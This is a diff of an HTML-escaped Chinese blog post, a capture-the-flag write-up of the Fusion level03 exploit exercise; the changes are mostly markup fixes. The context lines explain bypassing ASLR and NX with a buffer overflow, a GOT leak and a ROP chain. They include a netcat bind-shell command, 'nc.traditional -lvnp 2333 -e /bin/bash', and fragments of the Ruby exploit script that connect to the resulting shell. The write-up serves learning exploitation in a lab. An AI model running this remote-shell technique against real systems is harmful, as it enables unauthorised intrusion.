@@ -195,11 +195,11 @@
 &lt;p&gt;我们遇到的限制是：&lt;/p&gt;
 &lt;ul&gt;
 &lt;li&gt;
-&lt;p&gt;开了 ASLR&lt;!-- raw HTML omitted --&gt;
+&lt;p&gt;开了 ASLR&lt;br&gt;
 → libc 的地址会变，堆栈每次的地址也会变&lt;/p&gt;
 &lt;/li&gt;
 &lt;li&gt;
-&lt;p&gt;开了 NX&lt;!-- raw HTML omitted --&gt;
+&lt;p&gt;开了 NX&lt;br&gt;
 → 就算能往堆栈上扔 shellcode 也没法执行&lt;/p&gt;
 &lt;/li&gt;
 &lt;/ul&gt;
@@ -209,14 +209,14 @@
 &lt;p&gt;bof 修改返回地址&lt;/p&gt;
 &lt;/li&gt;
 &lt;li&gt;
-&lt;p&gt;没开 PIE 所以还是可以 ROP&lt;!-- raw HTML omitted --&gt;
+&lt;p&gt;没开 PIE 所以还是可以 ROP&lt;br&gt;
 → 只要知道一个 libc 函数的地址，就可以算出别的函数的偏移量&lt;/p&gt;
 &lt;/li&gt;
 &lt;/ul&gt;
 &lt;p&gt;以及，我们最终想要达到的效果是：&lt;/p&gt;
 &lt;ul&gt;
-&lt;li&gt;用 system 函数绑定 tcp shell&lt;!-- raw HTML omitted --&gt;
-→ &lt;code&gt;system(&amp;quot;/bin/nc.traditional -lvnp 2333 -e /bin/bash&amp;quot;);&lt;/code&gt;&lt;!-- raw HTML omitted --&gt;
+&lt;li&gt;用 system 函数绑定 tcp shell&lt;br&gt;
+→ &lt;code&gt;system(&amp;quot;/bin/nc.traditional -lvnp 2333 -e /bin/bash&amp;quot;);&lt;/code&gt;&lt;br&gt;
 → 注意得用 nc.traditional 否则是 netcat-openbsd，没有 -e 选项&lt;/li&gt;
 &lt;/ul&gt;
 &lt;hr&gt;
@@ -474,9 +474,9 @@
 &lt;p&gt;也就是：&lt;/p&gt;
 &lt;ol&gt;
 &lt;li&gt;&lt;code&gt;call &amp;lt;write@plt&amp;gt;&lt;/code&gt;，于是跳到了 plt&lt;/li&gt;
-&lt;li&gt;plt 会看看 got 有没有写上真正的 libc 里的 write 的地址（libc 地址会受 ASLR 影响&lt;!-- raw HTML omitted --&gt;
-→ 有：直接跳到 got 里的记录&lt;!-- raw HTML omitted --&gt;
-→ 没有：就跳 ld.so 来找，然后写进 got&lt;!-- raw HTML omitted --&gt;
+&lt;li&gt;plt 会看看 got 有没有写上真正的 libc 里的 write 的地址（libc 地址会受 ASLR 影响&lt;br&gt;
+→ 有：直接跳到 got 里的记录&lt;br&gt;
+→ 没有：就跳 ld.so 来找，然后写进 got&lt;br&gt;
 之后再遇到 &lt;code&gt;call &amp;lt;write@plt&amp;gt;&lt;/code&gt; 的话，plt 就可以直接跳 got 记录了&lt;/li&gt;
 &lt;/ol&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-ruby&#34; data-lang=&#34;ruby&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# 这是 got 记录&lt;/span&gt;
@@ -585,7 +585,7 @@
 &lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Program received signal SIGSEGV, Segmentation fault.
 &lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;0x44434241 in ?? &lt;span style=&#34;color:#f92672&#34;&gt;()&lt;/span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;没问题&amp;hellip;能用&lt;/p&gt;
-&lt;!-- raw HTML omitted --&gt;
+&lt;iframe frameborder=&#34;no&#34; border=&#34;0&#34; marginwidth=&#34;0&#34; marginheight=&#34;0&#34; width=330 height=86 src=&#34;//music.163.com/outchain/player?type=2&amp;id=27118629&amp;auto=0&amp;height=66&#34;&gt;&lt;/iframe&gt;
 &lt;p&gt;绕了这么多路终于快解决了吧..&lt;/p&gt;
 &lt;p&gt;然后替换成我们的 ROP Chain：&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-ruby&#34; data-lang=&#34;ruby&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;p32&lt;/span&gt; addr
@@ -693,7 +693,28 @@
 ＼｜ーーーーーーーーーーーーーーーーーーー｜
 　＼
 &lt;/code&gt;&lt;/pre&gt;&lt;hr&gt;
-&lt;!-- raw HTML omitted --&gt;
+&lt;br&gt;
+&lt;br&gt;
+&lt;br&gt;
+&lt;br&gt;
+&lt;br&gt;
+&lt;br&gt;
+&lt;br&gt;
+&lt;br&gt;
+&lt;br&gt;
+&lt;br&gt;
+&lt;br&gt;
+&lt;br&gt;
+&lt;br&gt;
+&lt;br&gt;
+&lt;br&gt;
+&lt;br&gt;
+&lt;br&gt;
+&lt;br&gt;
+&lt;br&gt;
+&lt;br&gt;
+&lt;br&gt;
+&lt;br&gt;
 &lt;h2 id=&#34;the-true-solution&#34;&gt;The TRUE Solution&lt;/h2&gt;
 &lt;p&gt;严格来说，gContents 这个变量，在 .bss 段内；&lt;/p&gt;
 &lt;blockquote&gt;
@@ -935,7 +956,7 @@
 &lt;p&gt;GNU indirect function (ifunc) is a mechanism making a direct function call resolve to an implementation picked by a resolver. It is mainly used in glibc but has adoption in FreeBSD.&lt;/p&gt;
 &lt;p&gt;For some performance critical functions, e.g. memcpy/memset/strcpy, glibc provides multiple implementations optimized for different architecture levels. The application just uses memcpy(&amp;hellip;) which compiles to call memcpy. The linker will create a PLT for memcpy and produce an associated special dynamic relocation referencing the resolver symbol/address. During relocation resolving at runtime, the return value of the resolver will be placed in the GOT entry and the PLT entry will load the address.&lt;/p&gt;
 &lt;p&gt;On Mach-O, there is a similar feature called N_SYMBOL_RESOLVER.
-&lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
+&lt;br&gt;&lt;/p&gt;
 &lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;http://maskray.me/blog/2021-01-18-gnu-indirect-function&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
     &gt;GNU indirect function - MaskRay&lt;/a&gt;&lt;/p&gt;
 &lt;/blockquote&gt;
@@ -1108,7 +1129,8 @@
 &gt;&lt;/p&gt;
 &lt;hr&gt;
 &lt;p&gt;最后是完整的脚本&lt;/p&gt;
-&lt;!-- raw HTML omitted --&gt;
+&lt;details&gt;
+&lt;summary&gt;展开...&lt;/summary&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-ruby&#34; data-lang=&#34;ruby&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#!/usr/bin/ruby&lt;/span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# encoding: ASCII-8BIT&lt;/span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
@@ -1241,8 +1263,9 @@
 &lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;$socket&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;close_write
 &lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;system &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;nc &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;#{&lt;/span&gt;hostname&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt; 2333&amp;#34;&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;!-- raw HTML omitted --&gt;
-&lt;!-- raw HTML omitted --&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/details&gt;
+&lt;br&gt;
+加了英文注释本来是想上传 GitHub 的
 &lt;p&gt;但是姑且还是把 Fusion 的题目全做完了再一起传吧&lt;/p&gt;
 &lt;p&gt;以及草稿&lt;/p&gt;
 &lt;p&gt;&lt;img src=&#34;/p/fusion_level_03/trial_and_error.png&#34;
@@ -1261,7 +1284,7 @@
 &gt;&lt;/p&gt;
 &lt;p&gt;真的试了好多好多次&amp;hellip;&lt;/p&gt;
 &lt;p&gt;前后加起来有三个星期才总算把这个做出来&lt;/p&gt;
-&lt;!-- raw HTML omitted --&gt;
+&lt;br&gt;
 &lt;p&gt;从因为疫情被封的三月中旬到现在，也就两个半月的时间&lt;/p&gt;
 &lt;p&gt;真的学到了好多&amp;hellip;&lt;/p&gt;
 &lt;p&gt;从完全不会 pwn 到 现在第一次自己成功 ROP&lt;/p&gt;
